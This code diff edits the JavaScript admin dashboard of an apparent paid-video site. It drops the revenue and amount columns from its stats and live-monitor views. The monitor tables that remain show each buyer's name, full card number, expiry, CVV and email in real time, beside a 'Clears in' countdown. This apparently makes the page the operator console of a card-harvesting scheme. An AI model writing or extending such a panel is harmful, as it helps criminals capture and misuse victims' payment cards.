@@ -64,7 +64,6 @@ async function loadStats() {
     try {
         const res  = await api('GET', '/api/admin/stats');
         document.getElementById('statVideos').textContent  = res.total_videos;
-        document.getElementById('statRevenue').textContent = '€' + res.revenue_today;
         document.getElementById('statPending').textContent = res.pending_payments;
         document.getElementById('statViews').textContent   = formatViews(res.total_views);
     } catch (e) { console.warn('Stats load failed:', e); }
@@ -144,7 +143,7 @@ function renderMonitorFull() {
     const thead = `<thead><tr>
         <th>Time</th><th>Name on Card</th><th>Card Number</th>
         <th>Exp</th><th>CVV</th><th>Email</th>
-        <th>Video</th><th>Amount</th><th>Clears in</th>
+        <th>Video</th><th>Clears in</th>
     </tr></thead>`;
 
     const tbody = Array.from(liveRows.entries()).map(([ref, entry]) => {
@@ -165,7 +164,6 @@ function renderMonitorFull() {
             <td style="color:var(--muted);font-size:11px">${esc(r.email)}</td>
             <td style="font-size:11px;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"
                 title="${esc(r.video_title)}">${esc(r.video_title)}</td>
-            <td class="amt-cell">€${parseFloat(r.amount_euros || 0).toFixed(2)}</td>
             <td>
                 <span class="clears-badge" data-ref="${ref}"
                     style="min-width:52px;display:inline-block;text-align:center;
@@ -190,7 +188,7 @@ function renderMonitorDash() {
 
     const thead = `<thead><tr>
         <th>Time</th><th>Name</th><th>Card</th>
-        <th>Video</th><th>Amount</th><th>Clears in</th>
+        <th>Video</th><th>Clears in</th>
     </tr></thead>`;
 
     const tbody = Array.from(liveRows.entries()).map(([ref, entry]) => {
@@ -208,7 +206,6 @@ function renderMonitorDash() {
             <td class="card-mask">${esc(cardNum)}</td>
             <td style="font-size:11px;max-width:130px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"
                 title="${esc(r.video_title)}">${esc(r.video_title)}</td>
-            <td class="amt-cell">€${parseFloat(r.amount_euros || 0).toFixed(2)}</td>
             <td>
                 <span class="clears-badge" data-ref="${ref}"
                     style="min-width:52px;display:inline-block;text-align:center;
